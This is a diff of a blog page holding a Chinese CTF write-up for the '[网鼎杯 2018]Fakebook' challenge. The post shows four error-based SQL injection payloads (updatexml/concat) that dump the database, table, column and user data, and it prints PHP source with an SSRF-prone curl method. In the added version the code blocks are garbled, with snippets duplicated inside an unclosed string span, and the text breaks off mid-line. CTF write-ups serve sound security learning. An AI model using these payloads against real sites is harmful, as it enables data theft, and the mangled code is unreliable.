@@ -1,525 +1,216 @@
-<!DOCTYPE HTML>
-<html lang="zh-CN">
-
-
-<head>
+<!DOCTYPE html>
+<html>
+  <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="[网鼎杯 2018]Fakebook, L">
-    <meta name="description" content="打开环境注册一个账号，登陆进去查看页面源代码有一个view.php?no=1的页面，看起来可以sql注入加个单引号测试报错那么报错注入走一波
-?no=1 and updatexml(1,concat(&#39;~&#39;,(select database">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <meta name="renderer" content="webkit|ie-stand|ie-comp">
-    <meta name="mobile-web-app-capable" content="yes">
-    <meta name="format-detection" content="telephone=no">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <link rel="alternate" href="/LawlietLW.github.io/atom.xml" title="L" type="application/atom+xml" />
+    
+    
+    
+    <link rel="stylesheet" type="text/css" href="/LawlietLW.github.io/css/normalize.css">
+    <link rel="stylesheet" type="text/css" href="/LawlietLW.github.io/css/index.css">
+    
+    <link rel="stylesheet" type="text/css" href="/LawlietLW.github.io/css/sidebar.css">
+    
+    
+<link rel="stylesheet" type="text/css" href="/LawlietLW.github.io/css/page.css">
+<link rel="stylesheet" type="text/css" href="/LawlietLW.github.io/css/post.css">
+
+    <link rel="stylesheet" type="text/css" href="/LawlietLW.github.io/css/custom.css">
+    <link rel="stylesheet" type="text/css" href="/LawlietLW.github.io/css/%5Bobject%20Object%5D.css">
+    <link rel="stylesheet" type="text/css" href="/LawlietLW.github.io/css/lightgallery.min.css">
+    <script type="text/javascript" src="/LawlietLW.github.io/js/jquery.min.js"></script>
+    <script defer type="text/javascript" src="/LawlietLW.github.io/js/util.js"></script>
+    <script defer type="text/javascript" src="/LawlietLW.github.io/js/clipboard.min.js"></script>
+    <script defer type="text/javascript" src="/LawlietLW.github.io/js/scrollspy.js"></script>
+    <script defer type="text/javascript" src="/LawlietLW.github.io/js/fontawesome-all.min.js"></script>
+    <script defer type="text/javascript" src="/LawlietLW.github.io/js/lightgallery.min.js"></script>
+    <script defer type="text/javascript" src="/LawlietLW.github.io/js/lg-fullscreen.min.js"></script>
+    <script defer type="text/javascript" src="/LawlietLW.github.io/js/lg-hash.min.js"></script>
+    <script defer type="text/javascript" src="/LawlietLW.github.io/js/lg-pager.min.js"></script>
+    <script defer type="text/javascript" src="/LawlietLW.github.io/js/lg-thumbnail.min.js"></script>
+    <script defer type="text/javascript" src="/LawlietLW.github.io/js/lg-zoom.min.js"></script>
+    
+    
+    <script defer type="text/javascript" src="/LawlietLW.github.io/js/search.js"></script>
+    <script type="text/javascript">
+    $(document).ready(function () {
+      var searchPath = "search.xml";
+      if (searchPath.length === 0) {
+        searchPath = "search.xml";
+      }
+      var path = "/LawlietLW.github.io/" + searchPath;
+      searchFunc(path, "search-input", "search-result");
+    });
+    </script>
+    
+    
+    <script defer type="text/javascript" src="/LawlietLW.github.io/js/index.js"></script>
+    <script type="text/javascript">
+    $(document).ready(function () {
+      var cb = null;
+      var els = $(".post figure.highlight");
+      if (els.length) {
+        // Enabled Hexo highlight line number.
+        $(els).each(function (i, e) {
+          // $(e).before("<button class=\"copy button\">Copy</button>");
+          $(e).before([
+            "<div class=\"code-titlebar\">",
+              "<div class=\"titlebar-left\">",
+                "<button class=\"copy\" aria-label=\"Copy\"><i class=\"far fa-copy\"></i></button>",
+              "</div>",
+              "<div class=\"titlebar-center\">",
+                "code",
+              "</div>",
+              "<div class=\"titlebar-right\">",
+                "<button class=\"button-dot dot-minimize\" aria-label=\"Decoration\"></button>",
+                "<button class=\"button-dot dot-maximize\" aria-label=\"Decoration\"></button>",
+                "<button class=\"button-dot dot-close\" aria-label=\"Decoration\"></button>",
+              "</div>",
+            "</div>"
+          ].join(""));
+        });
+        cb = new ClipboardJS("button.copy", {
+          "target": function (trigger) {
+              // Get target element by DOM API.
+              return trigger.parentNode.parentNode.nextElementSibling.firstChild.firstChild.firstChild.lastChild.firstChild.firstChild;
+          }
+        });
+      } else {
+        // Disabled Hexo highlight line number.
+        els = $(".post pre code");
+        $(els).each(function (i, e) {
+          // Add button before pre, not code.
+          // $(e).parent().before("<button class=\"copy button\">Copy</button>");
+          $(e).before([
+            "<div class=\"code-titlebar\">",
+              "<div class=\"titlebar-left\">",
+                "<button class=\"copy\" aria-label=\"Copy\"><i class=\"far fa-copy\"></i></button>",
+              "</div>",
+              "<div class=\"titlebar-center\">",
+                "code",
+              "</div>",
+              "<div class=\"titlebar-right\">",
+                "<button class=\"button-dot dot-minimize\" aria-label=\"Decoration\"></button>",
+                "<button class=\"button-dot dot-maximize\" aria-label=\"Decoration\"></button>",
+                "<button class=\"button-dot dot-close\" aria-label=\"Decoration\"></button>",
+              "</div>",
+            "</div>"
+          ].join(""));
+        });
+        cb = new ClipboardJS("button.copy", {
+          "target": function (trigger) {
+              // Get target element by DOM API.
+              return trigger.parentNode.parentNode.nextElementSibling;
+          }
+        });
+      }
+      cb.on("success", function (e) {
+        e.clearSelection();
+        var trigger = e.trigger;
+        // Change button text as a user tip.
+        trigger.innerHTML = "<i class=\"far fa-check-square\"></i>";
+        $(trigger).addClass("copied");
+        // Change button text back;
+        setTimeout(function () {
+          trigger.innerHTML = "<i class=\"far fa-copy\"></i>";
+          $(trigger).removeClass("copied");
+        }, 1500);
+      });
+    });
+    </script>
+    
+    <script defer type="text/javascript" src="/LawlietLW.github.io/js/custom.js"></script>
     <title>[网鼎杯 2018]Fakebook | L</title>
-    <link rel="icon" type="image/png" href="/favicon.png">
-
-    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
-    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
-    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
-    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
-    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
-    <link rel="stylesheet" type="text/css" href="/css/matery.css">
-    <link rel="stylesheet" type="text/css" href="/css/my.css">
+  <meta name="generator" content="Hexo 4.1.1"><link rel="stylesheet" href="/LawlietLW.github.io/css/prism-tomorrow.css" type="text/css"></head>
+  <body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN"  data-spy="scroll" data-target=".list-group">
     
-    <script src="/libs/jquery/jquery.min.js"></script>
-    
-<meta name="generator" content="Hexo 4.1.1"><link rel="alternate" href="/LawlietLW.github.io/atom.xml" title="L" type="application/atom+xml">
-<link rel="stylesheet" href="/LawlietLW.github.io/css/prism-tomorrow.css" type="text/css"></head>
-
-
-<body>
-    <header class="navbar-fixed">
-    <nav id="headNav" class="bg-color nav-transparent">
-        <div id="navContainer" class="nav-wrapper head-container">
-            <div class="brand-logo">
-                <a href="/LawlietLW.github.io/" class="waves-effect waves-light">
-                    
-                    <img src="/medias/1.png" class="logo-img" alt="LOGO">
-                    
-                    <span class="logo-span">L</span>
-                </a>
-            </div>
-            
-
-<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
-<ul class="right nav-menu">
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/" class="waves-effect waves-light">
+<header id="header" class="header">
+  <div class="container">
+    <div class="header-container">
+      <div class="header-title">
+        <h1 class="title"><a href="/LawlietLW.github.io/">L</a></h1>
+        <h2 class="subtitle"></h2>
+      </div>
       
-      <i class="fas fa-home" style="zoom: 0.6;"></i>
-      
-      <span>首页</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/tags" class="waves-effect waves-light">
-      
-      <i class="fas fa-tags" style="zoom: 0.6;"></i>
-      
-      <span>标签</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/categories" class="waves-effect waves-light">
-      
-      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
-      
-      <span>分类</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/archives" class="waves-effect waves-light">
-      
-      <i class="fas fa-archive" style="zoom: 0.6;"></i>
-      
-      <span>归档</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/about" class="waves-effect waves-light">
-      
-      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
-      
-      <span>关于</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/contact" class="waves-effect waves-light">
-      
-      <i class="fas fa-comments" style="zoom: 0.6;"></i>
-      
-      <span>留言板</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/friends" class="waves-effect waves-light">
-      
-      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
-      
-      <span>友情链接</span>
-    </a>
-    
-  </li>
-  
-  <li>
-    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
-      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
-    </a>
-  </li>
-</ul>
-
-<div id="mobile-nav" class="side-nav sidenav">
-
-    <div class="mobile-head bg-color">
-        
-        <img src="/medias/1.png" class="logo-img circle responsive-img">
-        
-        <div class="logo-name">L</div>
-        <div class="logo-desc">
-            
-            Never really desperate, only the lost of the soul.
-            
-        </div>
     </div>
-
-    
-
-    <ul class="menu-list mobile-menu-list">
+    <nav id="nav" class="nav">
+      <a id="nav-toggle" class="nav-toggle" aria-hidden="true"><i class="fas fa-bars" aria-label="Toggle Navbar"></i></a>
+      <ul id="menu" role="menubar" aria-hidden="false">
         
-        <li class="m-nav-item">
-	  
-		<a href="/" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-home"></i>
-			
-			首页
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/tags" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-tags"></i>
-			
-			标签
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/categories" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-bookmark"></i>
-			
-			分类
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/archives" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-archive"></i>
-			
-			归档
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/about" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-user-circle"></i>
-			
-			关于
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/contact" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-comments"></i>
-			
-			留言板
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/friends" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-address-book"></i>
-			
-			友情链接
-		</a>
-          
-        </li>
-        
-        
-    </ul>
-</div>
-
-        </div>
-
-        
+      </ul>
     </nav>
-
+  </div>
 </header>
 
-    
 
-
-
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
-    <div class="container" style="right: 0px;left: 0px;">
-        <div class="row">
-            <div class="col s12 m12 l12">
-                <div class="brand">
-                    <h1 class="description center-align post-title">[网鼎杯 2018]Fakebook</h1>
-                </div>
-            </div>
-        </div>
+    <main id="main" class="main">
+      <div class="container">
+        <div class="main-container">
+          <div class="content">
+            
+<div id="post" class="page">
+  
+  <article class="article post card" itemscope itemtype="http://schema.org/Article">
+    <div class="post-block">
+      <link itemprop="mainEntityOfPage" href="http://LawlietLW.github.io/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/">
+      <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+       <meta itemprop="name" content="Lock">
+       <meta itemprop="description" content="">
+       <meta itemprop="image" content="/LawlietLW.github.io/">
+      </span>
+      <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+       <meta itemprop="name" content="L">
+      </span>
     </div>
-</div>
-
-
-
-
-<main class="post-container content">
-
-    
-    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
-<style>
-    #articleContent h1::before,
-    #articleContent h2::before,
-    #articleContent h3::before,
-    #articleContent h4::before,
-    #articleContent h5::before,
-    #articleContent h6::before {
-        display: block;
-        content: " ";
-        height: 100px;
-        margin-top: -100px;
-        visibility: hidden;
-    }
-
-    #articleContent :focus {
-        outline: none;
-    }
-
-    .toc-fixed {
-        position: fixed;
-        top: 64px;
-    }
-
-    .toc-widget {
-        width: 345px;
-        padding-left: 20px;
-    }
-
-    .toc-widget .toc-title {
-        margin: 35px 0 15px 0;
-        padding-left: 17px;
-        font-size: 1.5rem;
-        font-weight: bold;
-        line-height: 1.5rem;
-    }
-
-    .toc-widget ol {
-        padding: 0;
-        list-style: none;
-    }
-
-    #toc-content {
-        height: calc(100vh - 250px);
-        overflow: auto;
-    }
-
-    #toc-content ol {
-        padding-left: 10px;
-    }
-
-    #toc-content ol li {
-        padding-left: 10px;
-    }
-
-    #toc-content .toc-link:hover {
-        color: #42b983;
-        font-weight: 700;
-        text-decoration: underline;
-    }
-
-    #toc-content .toc-link::before {
-        background-color: transparent;
-        max-height: 25px;
-    }
-
-    #toc-content .is-active-link {
-        color: #42b983;
-    }
-
-    #toc-content .is-active-link::before {
-        background-color: #42b983;
-    }
-
-    #floating-toc-btn {
-        position: fixed;
-        right: 15px;
-        bottom: 76px;
-        padding-top: 15px;
-        margin-bottom: 0;
-        z-index: 998;
-    }
-
-    #floating-toc-btn .btn-floating {
-        width: 48px;
-        height: 48px;
-    }
-
-    #floating-toc-btn .btn-floating i {
-        line-height: 48px;
-        font-size: 1.4rem;
-    }
-</style>
-<div class="row">
-    <div id="main-content" class="col s12 m12 l9">
-        <!-- 文章内容详情 -->
-<div id="artDetail">
-    <div class="card">
-        <div class="card-content article-info">
-            <div class="row tag-cate">
-                <div class="col s7">
-                    
-                    <div class="article-tag">
-                        
-                            <a href="/LawlietLW.github.io/tags/Web/">
-                                <span class="chip bg-color">Web</span>
-                            </a>
-                        
-                            <a href="/LawlietLW.github.io/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
-                                <span class="chip bg-color">PHP反序列化</span>
-                            </a>
-                        
-                            <a href="/LawlietLW.github.io/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">
-                                <span class="chip bg-color">报错注入</span>
-                            </a>
-                        
-                    </div>
-                    
-                </div>
-                <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/LawlietLW.github.io/categories/CTF/" class="post-category">
-                                CTF
-                            </a>
-                        
-                    </div>
-                    
-                </div>
-            </div>
-
-            <div class="post-info">
-                
-                <div class="post-date info-break-policy">
-                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-02-09
-                </div>
-                
-
-                
-                <div class="post-date info-break-policy">
-                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-02-09
-                </div>
-                
-
-                
-                <div class="info-break-policy">
-                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    802
-                </div>
-                
-
-                
-                <div class="info-break-policy">
-                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    3 分
-                </div>
-                
-
-                
-                    <div id="busuanzi_container_page_pv" class="info-break-policy">
-                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
-                        <span id="busuanzi_value_page_pv"></span>
-                    </div>
-				
-            </div>
-
-        </div>
-        <hr class="clearfix">
-        <div class="card-content article-card-content">
-            <div id="articleContent">
-                <p>打开环境<br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/1.jpg" alt=""><br>注册一个账号，登陆进去<br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/2.jpg" alt=""><br>查看页面源代码<br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/3.jpg" alt=""><br>有一个<code>view.php?no=1</code>的页面，看起来可以sql注入<br>加个单引号测试<br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/4.jpg" alt=""><br>报错<br>那么报错注入走一波</p>
-<pre class=" language-bash"><code class="language-bash">?no<span class="token operator">=</span>1 and updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span><span class="token string">'~'</span>,<span class="token punctuation">(</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">)</span>,1<span class="token punctuation">)</span>--+
-?no<span class="token operator">=</span>1 and updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span><span class="token string">'~'</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span><span class="token string">'fakebook'</span><span class="token punctuation">))</span>,1<span class="token punctuation">)</span>--+
-?no<span class="token operator">=</span>1 and updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span><span class="token string">'~'</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> from information_schema.columns where table_name<span class="token operator">=</span><span class="token string">'users'</span><span class="token punctuation">))</span>,1<span class="token punctuation">)</span>--+
-?no<span class="token operator">=</span>1 and updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span><span class="token string">'~'</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>data<span class="token punctuation">)</span> from users<span class="token punctuation">))</span>,1<span class="token punctuation">)</span>--+</code></pre>
+    <header class="post-header">
+      <h1 class="post-title" itemprop="name headline">[网鼎杯 2018]Fakebook</h1>
+      <div class="post-meta">
+        
+        <span class="post-date">
+          <i class="far fa-calendar-plus"></i><span><time title="post-date" itemprop="dateCreated datePublished" datetime="2020-02-09T15:26:17+08:00">2020-02-09 15:26:17</time></span>
+        </span>
+        
+        
+        
+        <span class="post-meta-divider divider">|</span>
+        
+        <span class="post-categories">
+          
+          <i class="far fa-folder-open"></i><span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/LawlietLW.github.io/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
+        </span>
+        
+        
+      </div>
+    </header>
+    <main class="post-main" itemprop="articleBody">
+      <p>打开环境<br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/1.jpg" alt=""><br>注册一个账号，登陆进去<br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/2.jpg" alt=""><br>查看页面源代码<br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/3.jpg" alt=""><br>有一个<code>view.php?no=1</code>的页面，看起来可以sql注入<br>加个单引号测试<br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/4.jpg" alt=""><br>报错<br>那么报错注入走一波</p>
+<figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre class=" language-hljs bash">?no=1 and updatexml(1,concat(<span class="hljs-string">'~'</span>,(select database())),1)--+<br>?no=1 and updatexml(1,concat(<span class="hljs-string">'~'</span>,(select group_concat(table_name) from information_schema.tables <span class="hljs-built_in">where</span> table_schema=<span class="hljs-string">'fakebook'</span>)),1)--+<br>?no=1 and updatexml(1,concat(<span class="hljs-string">'~'</span>,(select group_concat(column_name) from information_schema.columns <span class="hljs-built_in">where</span> table_name=<span class="hljs-string">'users'</span>)),1)--+<br>?no=1 and updatexml(1,concat(<span class="hljs-string"><code class="language-hljs bash">?no=1 and updatexml(1,concat(<span class="hljs-string">'~'</span>,(select database())),1)--+<br>?no=1 and updatexml(1,concat(<span class="hljs-string">'~'</span>,(select group_concat(table_name) from information_schema.tables <span class="hljs-built_in">where</span> table_schema=<span class="hljs-string">'fakebook'</span>)),1)--+<br>?no=1 and updatexml(1,concat(<span class="hljs-string">'~'</span>,(select group_concat(column_name) from information_schema.columns <span class="hljs-built_in">where</span> table_name=<span class="hljs-string">'users'</span>)),1)--+<br>?no=1 and updatexml(1,concat(<span class="hljs-string">'~'</span>,(select group_concat(data) from users)),1)--+<br></code></pre></td></tr></tbody></table></figure>
 <p><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/5.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/6.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/7.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/8.jpg" alt=""><br>可以看到用户信息的方式是序列化的<br>那接下来该怎么做，好像没了线索<br>emmmmmm<br>扫一波目录吧<br>果然扫到了好东西<br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/9.jpg" alt=""><br>下载来看看</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-
-
-<span class="token keyword">class</span> <span class="token class-name">UserInfo</span>
-<span class="token punctuation">{</span>
-    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
-    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
-    <span class="token keyword">public</span> <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
-
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">,</span> <span class="token variable">$blog</span><span class="token punctuation">)</span>
-    <span class="token punctuation">{</span>
-        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
-        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token punctuation">(</span>int<span class="token punctuation">)</span><span class="token variable">$age</span><span class="token punctuation">;</span>
-        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span> <span class="token operator">=</span> <span class="token variable">$blog</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-
-    <span class="token keyword">function</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span>
-    <span class="token punctuation">{</span>
-        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token variable">$httpCode</span> <span class="token operator">=</span> <span class="token function">curl_getinfo</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLINFO_HTTP_CODE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$httpCode</span> <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-            <span class="token keyword">return</span> <span class="token number">404</span><span class="token punctuation">;</span>
-        <span class="token punctuation">}</span>
-        <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-        <span class="token keyword">return</span> <span class="token variable">$output</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getBlogContents</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>
-    <span class="token punctuation">{</span>
-        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-
-    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">isValidBlog</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>
-    <span class="token punctuation">{</span>
-        <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span><span class="token punctuation">;</span>
-        <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i"</span><span class="token punctuation">,</span> <span class="token variable">$blog</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-
-<span class="token punctuation">}</span></code></pre>
+<figure class="hljs highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre class=" language-hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span><br></span>{<br>    <span class="hljs-keyword">public</span> $name = <span class="hljs-string">""</span>;<br>    <span class="hljs-keyword">public</span> $age = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> $blog = <span class="hljs-string">""</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($name, $age, $blog)</span><br>    </span>{<br>        <span class="hljs-keyword">$this</span>-&gt;name = $name;<br>        <span class="hljs-keyword">$this</span>-&gt;age = (int)$age;<br>        <span class="hljs-keyword">$this</span>-&gt;blog = $blog;<br>    }<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span><span class="hljs-params">($url)</span><br>    </span>{<br>        $ch = curl_init();<br><br>        curl_setopt($ch, CURLOPT_URL, $url);<br>        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        $output = curl_exec($ch);<br>        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);<br>        <span class="hljs-keyword">if</span>($httpCode == <span class="hljs-number">404</span>) {<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;<br>        }<br>        curl_close($ch);<br><br>        <span class="hljs-keyword">return</span> $output;<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> <span class="hljs-params">()</span><br>    </span>{<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get(<span class="hljs-keyword">$this</span>-&gt;blog);<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> <span class="hljs-params">()</span><br>    </span>{<br>        $blog = <span class="hljs-keyword">$this</span>-&gt;blog;<br>        <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string"><code class="language-hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span><br></span>{<br>    <span class="hljs-keyword">public</span> $name = <span class="hljs-string">""</span>;<br>    <span class="hljs-keyword">public</span> $age = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> $blog = <span class="hljs-string">""</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($name, 